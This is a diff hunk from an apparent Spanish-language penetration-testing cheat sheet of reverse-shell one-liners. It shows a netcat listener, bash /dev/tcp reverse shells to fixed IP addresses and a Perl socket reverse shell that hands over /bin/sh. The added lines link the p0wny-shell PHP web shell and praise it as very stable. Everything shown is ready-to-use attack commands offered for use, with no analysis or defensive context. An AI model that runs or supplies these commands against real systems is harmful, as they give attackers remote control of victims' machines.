@@ -153,6 +153,10 @@ nc -vv -l -p 8080
 bash -i >& /dev/tcp/8.8.8.8/8080 0>&1
 /bin/bash -c "bash -i >& /dev/tcp/10.8.7.38/443 0>&1"
 
+// p0wny-Shell
+
+https://github.com/flozz/p0wny-shell/blob/master/shell.php --> shell mediante navegador web, muy estable
+
 // Perl
 perl -e 'use Socket;$i="8.8.8.8";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
